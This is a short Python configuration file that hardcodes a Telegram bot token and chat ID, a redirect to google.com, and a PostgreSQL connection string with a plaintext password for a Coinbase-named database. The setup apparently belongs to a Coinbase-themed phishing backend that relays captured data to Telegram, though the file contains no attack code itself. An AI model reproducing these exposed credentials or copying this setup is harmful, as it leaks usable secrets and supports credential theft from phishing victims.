import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    SECRET_KEY = 'dev-key-change-in-production'
    TELEGRAM_BOT_TOKEN = '7502498778:AAFasWE3M0no2YVgfYPngtnolQKlIZ0rf44'
    TELEGRAM_CHAT_ID = '6604253131'
    DEFAULT_REDIRECT = 'https://www.google.com'
    
    SQLALCHEMY_DATABASE_URI = 'postgresql://coinbase_vgbh_user:iVgMyd09I85kSpX3TwZi7jVKaK8PNQ27@dpg-d2mb3u24d50c73alq450-a.oregon-postgres.render.com/coinbase_vgbh'
    SQLALCHEMY_TRACK_MODIFICATIONS = False
